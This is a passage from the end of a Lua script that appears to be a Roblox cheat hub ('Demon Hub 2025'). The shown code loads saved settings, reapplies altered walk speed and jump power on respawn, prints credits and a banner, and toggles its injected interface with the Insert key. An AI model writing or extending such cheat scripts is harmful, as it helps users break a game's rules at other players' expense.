        Utils.Notify("Import", "Settings imported successfully", 2)
        
        -- Auto-save after import
        task.wait(1)
        saveSettings(false)
    end)
    
    if not success then
        Utils.Notify("Import", "Import failed: " .. tostring(error), 3)
        warn("Import error: " .. tostring(error))
    end
end)

-- Load settings on startup
task.spawn(function()
    task.wait(2) -- Wait for everything to initialize
    loadSettings(false)
end)

-- 20. ═══════════════ FINAL SETUP & CREDITS ═══════════════
-- Auto-update character references
LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    Humanoid = newChar:WaitForChild("Humanoid")
    RootPart = newChar:WaitForChild("HumanoidRootPart")
    
    -- Reapply settings
    Humanoid.WalkSpeed = Movement.WalkSpeed
    Humanoid.JumpPower = Movement.JumpPower
end)

-- Credits section
Tabs.Settings:Button("Credits", function()
 Utils.Notify("Credits", "Demon Hub 2025 | CORRUPT CORE • Engineered by Alzn", 5)
 Utils.Notify("Credits", "Concept legacy upheld — evolution by xc3vh", 5)
end)

-- Completion message
print([[
╔══════════════════════════════════════════════════════════════════════════╗
║                   DEMON HUB 2025 — CORRUPT CORE EDITION                  ║
║                        Successfully Loaded!                              ║
║                                                                          ║
║  Features:                                                               ║
║    • Streamlined UI for better organization                              ║
║    • Enhanced error handling and security                                ║
║    • Optimized for high performance                                      ║
║    • Improved state and memory management                                ║
║    • Clean, modular, professional codebase                               ║
║    • New features and powerful enhancements                              ║
║                                                                          ║
║                 Press Insert to toggle the UI                            ║
╚══════════════════════════════════════════════════════════════════════════╝
]])

local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local MainUI = CoreGui:WaitForChild("Discord")

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Insert then
        if MainUI:IsA("ScreenGui") then
            MainUI.Enabled = not MainUI.Enabled
            Utils.Notify("UI", MainUI.Enabled and "UI Shown" or "UI Hidden", 1)
        else
            MainUI.Visible = not MainUI.Visible
            Utils.Notify("UI", MainUI.Visible and "UI Shown" or "UI Hidden", 1)
        end
    end
end)
-- ═══════════════ END OF DEMON HUB 2025 CORE EDITION ═══════════════
